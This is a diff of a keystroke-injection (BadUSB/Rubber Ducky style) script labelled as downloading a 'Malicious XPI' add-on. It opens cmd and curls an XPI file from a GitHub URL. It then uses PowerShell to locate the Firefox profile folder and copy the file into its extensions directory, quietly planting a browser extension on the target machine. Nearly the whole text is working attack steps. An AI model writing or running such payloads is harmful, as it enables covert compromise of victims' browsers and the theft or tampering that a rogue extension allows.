@@ -1,8 +1,26 @@
+REM =========================================
 REM Download Malicious XPI add ons with cmd
+REM =========================================
 GUI r
 DELAY 500
 STRING cmd
 ENTER
+DELAY 1000
+STRING curl -o {12b95466-80d5-4216-842e-91f82013a93a}.xpi -L https://github.com/dplantard/tools_web/blob/main/%7B12b95466-80d5-4216-842e-91f82013a93a%7D.xpi?raw=true
+ENTER
+DELAY 2000
+ALT F4
+REM ============================================================
+REM Copy Malicious XPI via Powershell using var Env and regex
+REM ============================================================
+GUI r
 DELAY 500
-STRING curl -o  test.xpi -L https://github.com/dplantard/tools_web/blob/main/%7B12b95466-80d5-4216-842e-91f82013a93a%7D.xpi?raw=true
-ENTER 
+STRING powershell
+ENTER
+DELAY 500
+STRING $profile_name = Get-ChildItem -name C:\Users\54221A\AppData\Roaming\Mozilla\Firefox\Profiles\*.darwinPROD1
+ENTER
+DELAY 500
+STRING Copy-Item "{12b95466-80d5-4216-842e-91f82013a93a}.xpi" -Destination "C:\Users\54221A\AppData\Roaming\Mozilla\Firefox\Profiles\$profile_name\extensions"
+ENTER
+DELAY 500
